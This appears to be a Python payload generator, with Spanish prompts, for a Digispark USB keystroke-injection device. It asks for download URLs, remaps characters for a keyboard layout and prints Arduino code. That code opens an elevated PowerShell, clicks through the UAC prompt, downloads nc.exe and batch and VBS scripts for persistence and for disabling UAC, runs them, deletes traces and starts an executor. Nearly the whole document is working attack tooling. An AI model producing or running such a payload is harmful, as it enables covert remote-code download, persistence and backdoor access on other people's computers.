  ejec_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(ejec_reem.keys()))))  
  new_ejec = regex.sub(lambda x: str(ejec_reem[x.string[x.start() :x.end()]]), ejec)
  print() 

  persi = input("INGRESA LA RUTA DE persist.bat: >> ")
  persi_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(persi_reem.keys()))))  
  new_persi = regex.sub(lambda x: str(persi_reem[x.string[x.start() :x.end()]]), persi)
  print()

  orde = input("INGRESA LA RUTA DE orden.bat: >> ")
  orde_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(orde_reem.keys()))))  
  new_orde = regex.sub(lambda x: str(orde_reem[x.string[x.start() :x.end()]]), orde)
  print()

  desuac = input("INGRESA LA RUTA DE des_uac.bat: >> ")
  desuac_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(desuac_reem.keys()))))  
  new_desuac = regex.sub(lambda x: str(desuac_reem[x.string[x.start() :x.end()]]), desuac)
  print()

  nc = input("INGRESA LA RUTA DE nc.exe: >> ")
  nc_reem = {"(" : "*","/" : "&",")" : "(","=" : ")","’" : "-","-" : "/","ñ" : ";",";" : "<","¡" : "=",":" : ">","_" : "?","”" : "@","`" : "[","+" : "]","&" : "^","?" : "_","<" : "`","^" : "{","*" : "}",">" : "~",'“' : "@",'"' : "@","‘" : "-","'" : "-"}  
  regex = re.compile("(%s)" % "|".join(map(re.escape, list(nc_reem.keys()))))  
  new_nc = regex.sub(lambda x: str(nc_reem[x.string[x.start() :x.end()]]), nc)
  
  nine_cade1 = """DigiKeyboard.println("$down ) New/Object System.Net.WebClient< $url ) -""" 
  nine_cade2 = (new_nc)
  nine_cade3 = """-< $file ) -nc.exe-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade4 = (new_ejec)
  nine_cade5 = """-< $file ) -ejecutor.vbs-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade6 = (new_persi)
  nine_cade7 = """-< $file ) -persist.bat-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade8 = (new_orde)
  nine_cade9 = """-< $file ) -orden.bat-< $down.DownloadFile*$url,$file(< $down ) New/Object System.Net.WebClient< $url ) -"""
  nine_cade10 = (new_desuac)
  nine_cade11 = """-< $file ) -des?uac.bat-< $down.DownloadFile*$url,$file(");"""
  
  print("""
  #include "DigiKeyboard.h"
  #define KEY_TAB     43
  void setup() {
  }

  void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  Keyboard.releaseAll();
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell start/process powershell /verb runas");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);""")
  print()
  nine_concaty ="  {0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}"
  print(nine_concaty.format(nine_cade1, nine_cade2, nine_cade3, nine_cade4, nine_cade5, nine_cade6, nine_cade7, nine_cade8, nine_cade9, nine_cade10, nine_cade11))
  print("""

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(9000);
  DigiKeyboard.println("persist.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("des?uac.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("del persist.bat< del des?uac.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("ejecutor.vbs< exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}""")


